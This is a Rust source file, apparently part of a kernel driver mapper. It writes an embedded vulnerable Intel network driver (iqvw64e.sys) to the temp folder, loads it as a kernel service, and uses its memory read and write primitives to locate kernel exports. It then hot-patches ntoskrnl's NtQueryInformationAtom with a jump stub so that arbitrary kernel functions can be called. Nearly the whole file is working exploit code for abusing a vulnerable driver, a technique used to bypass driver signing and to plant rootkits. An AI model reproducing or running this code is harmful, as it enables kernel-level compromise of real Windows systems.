use core::panic;
use std::{
    ffi::CStr,
    io::{Read, Write},
    path::{Path, PathBuf},
};

use winapi::{
    ctypes::c_void,
    shared::{
        minwindef::DWORD,
        ntdef::{NT_SUCCESS, ULONG},
    },
    um::{
        errhandlingapi::SetLastError,
        libloaderapi::{GetProcAddress, LoadLibraryA},
        memoryapi::{VirtualAlloc, VirtualFree},
        winnt::{
            DELETE, HANDLE, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE,
            IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
            PAGE_READWRITE, PIMAGE_EXPORT_DIRECTORY, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
            SERVICE_KERNEL_DRIVER,
        },
        winsvc::{
            CloseServiceHandle, ControlService, CreateServiceA, DeleteService, OpenSCManagerA,
            OpenServiceA, StartServiceA, SC_MANAGER_CREATE_SERVICE, SERVICE_CONTROL_STOP,
            SERVICE_START, SERVICE_STATUS, SERVICE_STOP,
        },
    },
};

pub static DRIVER_NAME: &str = "iqvw64e.sys\0";

use crate::{
    nt::{self, RtlProcessModuleInformation},
    service::{self, force_write_memory, read_memory},
    util,
};

pub fn get_temporary_folder_path() -> PathBuf {
    std::env::temp_dir()
}

pub fn get_path_to_driver() -> PathBuf {
    let mut path = get_temporary_folder_path();
    path.push(DRIVER_NAME.strip_suffix('\0').unwrap());

    path
}

pub fn create_driver_file(file: &String) -> bool {
    let mut file = std::fs::File::create(Path::new(file)).expect("Couldn't create/open file!");

    // Thank god for this macro!
    let driver = include_bytes!("../mapper/driver.sys");

    file.write_all(driver).expect("Couldn't write file");

    true
}

pub fn read_file_to_memory(file: &String, buffer: &mut Vec<u8>) -> bool {
    let mut file = std::fs::File::open(file).expect("Couldn't open file");

    file.read_to_end(buffer).expect("Couldn't read file");

    true
}

pub fn create_and_start_service(file: &String) -> bool {
    let mut filename = std::path::Path::new(file)
        .file_name()
        .expect("Couldn't get filname")
        .to_str()
        .expect("Couldn't convert to str")
        .to_string();
    filename.push('\0');

    println!("File name: {}", filename);

    let mut actual_file_path = file.to_owned();
    actual_file_path.push('\0');

    let manager = unsafe {
        OpenSCManagerA(
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            SC_MANAGER_CREATE_SERVICE,
        )
    };

    if manager.is_null() {
        panic!("Failed to open service manager!");
    }

    let mut service = unsafe {
        CreateServiceA(
            manager,
            DRIVER_NAME.as_ptr() as _,
            DRIVER_NAME.as_ptr() as _,
            SERVICE_START | SERVICE_STOP | DELETE,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            actual_file_path.as_ptr() as _,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        )
    };

    if service.is_null() {
        println!("Unable to create service, attempting to open instead");

        service = unsafe { OpenServiceA(manager, filename.as_ptr() as _, SERVICE_START) };

        if service.is_null() {
            unsafe { CloseServiceHandle(manager) };
            panic!("Unable to create service!");
        }
    }

    let result = unsafe { StartServiceA(service, 0, std::ptr::null_mut()) };

    unsafe {
        CloseServiceHandle(service);
        CloseServiceHandle(manager);
    }

    result == 1
}

pub fn delete_and_stop_service(name: &str) -> bool {
    let manager = unsafe {
        OpenSCManagerA(
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            SC_MANAGER_CREATE_SERVICE,
        )
    };

    if manager.is_null() {
        panic!("Unable to open service manager!");
    }

    let service =
        unsafe { OpenServiceA(manager, name.as_ptr() as *const i8, SERVICE_STOP | DELETE) };

    if service.is_null() {
        unsafe { CloseServiceHandle(service) };
        panic!("Failed to open service");
    }

    let mut status: SERVICE_STATUS = unsafe { core::mem::zeroed() };

    let result = unsafe {
        ControlService(service, SERVICE_CONTROL_STOP, &mut status as *mut _) == 1
            && DeleteService(service) == 1
    };

    unsafe {
        CloseServiceHandle(service);
        CloseServiceHandle(manager);
    }

    result
}

pub fn get_kernel_module_address(name: String) -> u64 {
    let mut buffer: *mut c_void = std::ptr::null_mut();
    let mut buffer_size: DWORD = 0;

    let mut system_info = nt::query_system_information(buffer, &mut buffer_size);

    while system_info.result as u32 == nt::STATUS_INFO_LENGHT_MISMATCH {
        unsafe { VirtualFree(buffer, 0, MEM_RELEASE) };

        buffer = unsafe {
            VirtualAlloc(
                std::ptr::null_mut(),
                buffer_size as _,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        } as _;
        system_info = nt::query_system_information(buffer, &mut buffer_size);
    }

    if !NT_SUCCESS(system_info.result) {
        unsafe { VirtualFree(system_info.buffer, 0, MEM_RELEASE) };
        return 0u64;
    }

    let modules = buffer as *mut nt::RtlProcessModules;

    unsafe {
        for i in 0..(*modules).number_of_modules {
            let current_module = (buffer as usize
                + std::mem::size_of::<ULONG>()
                + i as usize * std::mem::size_of::<RtlProcessModuleInformation>())
                as *mut RtlProcessModuleInformation;

            let module_name = String::from_utf8(
                (*current_module)
                    .full_path_name
                    .iter()
                    .skip(4)
                    .map(|i| *i as u8)
                    .take_while(|&i| i as char != char::from(0))
                    .collect(),
            );

            if !module_name.is_ok() {
                continue;
            }

            let actual_name = module_name.unwrap();

            let image_base_test =
                current_module as usize + std::mem::size_of::<*mut c_void>() * 2usize;

            if actual_name.contains(&name) {
                let result = ((image_base_test + 4usize) as *mut u64).read();
                VirtualFree(buffer as _, 0, MEM_RELEASE);

                // Due to call earlier we get an invalid address error-code, we can just clear it and ignore it.
                SetLastError(0);

                return result;
            }
        }
    }

    unsafe { VirtualFree(buffer as _, 0, MEM_RELEASE) };
    0u64
}

pub fn get_kernel_module_export(service: HANDLE, kernel_module_base: u64, fn_name: &str) -> u64 {
    if kernel_module_base == 0 {
        return 0;
    }

    let mut dos_header: IMAGE_DOS_HEADER = unsafe { core::mem::zeroed() };
    let mut nt_header: IMAGE_NT_HEADERS64 = unsafe { core::mem::zeroed() };

    if !service::read_memory(
        service,
        kernel_module_base,
        &mut dos_header as *mut IMAGE_DOS_HEADER as _,
        std::mem::size_of::<IMAGE_DOS_HEADER>() as _,
    ) || dos_header.e_magic != IMAGE_DOS_SIGNATURE
    {
        return 0;
    }

    if !service::read_memory(
        service,
        kernel_module_base + dos_header.e_lfanew as u64,
        &mut nt_header as *mut IMAGE_NT_HEADERS64 as _,
        std::mem::size_of::<IMAGE_NT_HEADERS64>() as _,
    ) || nt_header.Signature != IMAGE_NT_SIGNATURE
    {
        return 0;
    }

    let export_base = nt_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
        .VirtualAddress;
    let export_base_size =
        nt_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].Size;

    if export_base == 0 || export_base_size == 0 {
        return 0;
    }

    let export_data = unsafe {
        VirtualAlloc(
            std::ptr::null_mut(),
            export_base_size as _,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    } as PIMAGE_EXPORT_DIRECTORY;

    if !service::read_memory(
        service,
        kernel_module_base + export_base as u64,
        export_data as _,
        export_base_size as u64,
    ) {
        unsafe { VirtualFree(export_data as _, 0, MEM_RELEASE) };
        return 0;
    }

    let delta = export_data as u64 - export_base as u64;

    let name_table = unsafe { ((*export_data).AddressOfNames as u64 + delta) as *mut u32 };
    let ordinal_table =
        unsafe { ((*export_data).AddressOfNameOrdinals as u64 + delta) as *mut u16 };
    let function_table = unsafe { ((*export_data).AddressOfFunctions as u64 + delta) as *mut u32 };

    for i in 0..unsafe { (*export_data).NumberOfNames } as isize {
        // let current_function_name =
        //     unsafe { CString::from_raw((name_table.offset(i).read() as u64 + delta) as _) }
        //         .to_str()
        //         .expect("Couldn't convert to str")
        //         .to_string();
        let name_ptr = unsafe { name_table.offset(i).read() as u64 + delta } as *mut char;
        let current_function_name = unsafe {
            CStr::from_ptr(name_ptr as _)
                .to_owned()
                .to_str()
                .unwrap()
                .to_string()
        };

        if current_function_name.eq(fn_name) {
            let fn_ordinal = unsafe { ordinal_table.offset(i).read() };
            let fn_address = kernel_module_base
                + unsafe { function_table.offset(fn_ordinal as _).read() } as u64;

            if fn_address >= kernel_module_base + export_base as u64
                && fn_address <= kernel_module_base + export_base as u64 + export_base_size as u64
            {
                unsafe { VirtualFree(export_data as _, 0, MEM_RELEASE) };
                return 0;
            }

            unsafe { VirtualFree(export_data as _, 0, MEM_RELEASE) };
            return fn_address;
        }
    }

    unsafe { VirtualFree(export_data as _, 0, MEM_RELEASE) };
    panic!("Couldn't find export: {}...", fn_name);
}

pub fn get_nt_gdi_dd_ddl_reclaim_allocations_info(
    service: HANDLE,
    out_kernel_function_ptr: &mut u64,
    out_original_kernel_function_address: &mut u64,
) -> bool {
    // 488b05650e1400 mov     rax, qword ptr [rip+offset]
    // ff150f211600   call    cs:__guard_dispatch_icall_fptr
    static mut KERNEL_FUNCTION_PTR: u64 = 0;
    static mut KERNEL_ORIGINAL_FUNCTION_ADDRESS: u64 = 0;

    if unsafe { KERNEL_FUNCTION_PTR == 0 || KERNEL_ORIGINAL_FUNCTION_ADDRESS == 0 } {
        let nt_gdi_ddi_reclaim_allocations2 = get_kernel_module_export(
            service,
            util::get_kernel_module_address("win32kbase.sys".to_string()) as _,
            "NtGdiDdDDIReclaimAllocations2",
        );

        if nt_gdi_ddi_reclaim_allocations2 == 0 {
            println!("Unable to find NtGdiDdDDIReclaimAllocations2");
            return false;
        }

        let kernel_function_ptr_offset_address = nt_gdi_ddi_reclaim_allocations2 + 0x7;
        let mut function_ptr_offset = 0;

        if !read_memory(
            service,
            kernel_function_ptr_offset_address,
            &mut function_ptr_offset as *mut _ as u64,
            std::mem::size_of::<usize>() as _,
        ) {
            return false;
        }

        unsafe {
            KERNEL_FUNCTION_PTR = nt_gdi_ddi_reclaim_allocations2 + 0xB + function_ptr_offset as u64
        };

        if unsafe {
            !read_memory(
                service,
                KERNEL_FUNCTION_PTR,
                &mut KERNEL_ORIGINAL_FUNCTION_ADDRESS as *mut _ as u64,
                std::mem::size_of::<u64>() as _,
            )
        } {
            return false;
        }
    }

    *out_kernel_function_ptr = unsafe { KERNEL_FUNCTION_PTR };
    *out_original_kernel_function_address = unsafe { KERNEL_ORIGINAL_FUNCTION_ADDRESS };

    true
}

pub fn get_nt_gdi_get_copp_compatible_opm_information_info(
    service: HANDLE,
    out_kernel_function_ptr: &mut u64,
    out_kernel_original_bytes: *mut u8,
) -> bool {
    static mut KERNEL_FUNCTION_PTR: u64 = 0;
    static mut KERNEL_ORIGINAL_BYTES: Vec<u8> = Vec::new();

    if unsafe { KERNEL_FUNCTION_PTR == 0 || KERNEL_ORIGINAL_BYTES[0] == 0 } {
        unsafe { KERNEL_ORIGINAL_BYTES.fill(0) };

        let nt_gdi_get_copp_compatible_opm_information_info = get_kernel_module_export(
            service,
            get_kernel_module_address("win32kbase.sys".to_string()) as _,
            "NtGdiGetCOPPCompatibleOPMInformation",
        );

        if nt_gdi_get_copp_compatible_opm_information_info == 0 {
            println!("Unable to find NtGdiGetCOPPCompatibleOPMInformation");
            return false;
        }
        unsafe {
            KERNEL_FUNCTION_PTR = nt_gdi_get_copp_compatible_opm_information_info;
        }

        if unsafe {
            !read_memory(
                service,
                KERNEL_FUNCTION_PTR,
                KERNEL_ORIGINAL_BYTES.as_mut_ptr() as *mut _ as u64,
                (std::mem::size_of::<u8>() * KERNEL_ORIGINAL_BYTES.len() as usize) as _,
            )
        } {
            println!("ReadMemory failed!!");
            return false;
        }
    }

    *out_kernel_function_ptr = unsafe { KERNEL_FUNCTION_PTR };
    unsafe {
        std::ptr::copy(
            KERNEL_ORIGINAL_BYTES.as_mut_ptr(),
            out_kernel_original_bytes,
            std::mem::size_of::<u8>() * KERNEL_ORIGINAL_BYTES.len() as usize,
        )
    };

    true
}

// Smart way to do this eh?
pub fn call_kernel_fn(
    service: HANDLE,
    call_function: &mut dyn FnMut(*mut usize) -> bool,
    kernel_function_address: u64,
) -> bool {
    if kernel_function_address == 0 {
        panic!("Kernel export apparently 0? What are we gonna do about it?");
    }

    // Wrap entire function because why not.
    unsafe {
        let nt_query_information_atom = GetProcAddress(
            LoadLibraryA("ntdll.dll\0".as_ptr() as _),
            "NtQueryInformationAtom\0".as_ptr() as _,
        );

        if nt_query_information_atom.is_null() {
            panic!("Couldn't find target function, are you on 20h2?")
        }

        let mut kernel_injected_jmp: [u8; 12] = [
            0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0,
        ];
        let mut original_kernel_fn = vec![0u8; 12];

        ((kernel_injected_jmp.as_mut_ptr() as usize + 2usize) as *mut u64)
            .write(kernel_function_address);

        let kernel_nt_query_information_atom = get_kernel_module_export(
            service,
            get_kernel_module_address("ntoskrnl.exe".to_string()),
            "NtQueryInformationAtom",
        );

        if kernel_nt_query_information_atom == 0 {
            println!("Couldn't get export ntoskrnl.NtQueryInformationAtom");
            return false;
        }

        if !read_memory(
            service,
            kernel_nt_query_information_atom,
            original_kernel_fn.as_mut_ptr() as _,
            kernel_injected_jmp.len() as _,
        ) {
            println!("Couldn't read memory");
            return false;
        }

        if !force_write_memory(
            service,
            kernel_nt_query_information_atom,
            kernel_injected_jmp.as_ptr() as _,
            kernel_injected_jmp.len() as _,
        ) {
            println!("Couldn't write memory");
            return false;
        }

        call_function(nt_query_information_atom as _);

        if !force_write_memory(
            service,
            kernel_nt_query_information_atom,
            original_kernel_fn.as_mut_ptr() as _,
            original_kernel_fn.len() as _,
        ) {
            println!("Couldn't restore function!");
            return false;
        }

        // NOTE: this is for older versions of windows!
        // let nt_gdi_dd_ddi_reclaim_allocations = GetProcAddress(
        //     LoadLibraryA("gdi32full.dll\0".as_ptr() as _),
        //     "NtGdiDdDDIReclaimAllocations2\0".as_ptr() as _,
        // );
        // let nt_gdi_get_copp_compatible_opm_information = GetProcAddress(
        //     LoadLibraryA("win32u.dll\0".as_ptr() as _),
        //     "NtGdiGetCOPPCompatibleOPMInformation\0".as_ptr() as _,
        // );

        // if nt_gdi_dd_ddi_reclaim_allocations.is_null()
        //     && nt_gdi_get_copp_compatible_opm_information.is_null()
        // {
        //     panic!("Failed to find NtGdiDdDDIReclaimAllocations2 or NtGdiGetCOPPCompatibleOPMInformation");
        // }

        // let mut kernel_fn_pointer: u64 = 0;
        // let mut kernel_original_function_address: u64 = 0;
        // let mut kernel_original_function_jmp = vec![0u8, 12];

        // if !nt_gdi_dd_ddi_reclaim_allocations.is_null() {
        //     // Get function pointer (@win32kbase!gDxgkInterface table) used by NtGdiDdDDIReclaimAllocations2
        //     // and save the original address (dxgkrnl!DxgkReclaimAllocations2)
        //     if !get_nt_gdi_dd_ddl_reclaim_allocations_info(
        //         service,
        //         &mut kernel_fn_pointer,
        //         &mut kernel_original_function_address,
        //     ) {
        //         return false;
        //     }

        //     // Overwrite the pointer with kernel_function_address
        //     if !force_write_memory(
        //         service,
        //         kernel_fn_pointer,
        //         &mut kernel_function_address as *mut u64 as _,
        //         std::mem::size_of::<u64>() as _,
        //     ) {
        //         return false;
        //     }
        // } else {
        //     if !get_nt_gdi_get_copp_compatible_opm_information_info(
        //         service,
        //         &mut kernel_fn_pointer,
        //         kernel_original_function_jmp.as_mut_ptr(),
        //     ) {
        //         return false;
        //     }

        //     // Overwrite jmp with 'movabs rax, <kernel_function_address>, jmp rax'
        //     std::ptr::copy(
        //         &kernel_function_address,
        //         (kernel_function_jmp.as_ptr() as usize + 2usize) as _,
        //         std::mem::size_of::<u64>(),
        //     );

        //     if !force_write_memory(
        //         service,
        //         kernel_fn_pointer,
        //         kernel_function_jmp.as_mut_ptr() as *mut _,
        //         (std::mem::size_of::<u8>() * kernel_function_jmp.len() as usize) as _,
        //     ) {
        //         return false;
        //     }
        // }

        // let mut function = std::ptr::null_mut();
        // if !nt_gdi_get_copp_compatible_opm_information.is_null() {
        //     function = nt_gdi_get_copp_compatible_opm_information;
        // } else if !nt_gdi_dd_ddi_reclaim_allocations.is_null() {
        //     function = nt_gdi_dd_ddi_reclaim_allocations;
        // }

        // if !function.is_null() {
        //     call_function(function as _);
        // }

        // if !nt_gdi_get_copp_compatible_opm_information.is_null() {
        //     force_write_memory(
        //         service,
        //         kernel_fn_pointer,
        //         &mut kernel_original_function_address as *mut u64 as _,
        //         std::mem::size_of::<u64>() as _,
        //     );
        // } else {
        //     force_write_memory(
        //         service,
        //         kernel_fn_pointer,
        //         kernel_original_function_jmp.as_mut_ptr() as *mut _,
        //         (std::mem::size_of::<u8>() * kernel_function_jmp.len() as usize) as _,
        //     );
        // }
    }

    println!("Succesfully called kernel fn!");
    true
}
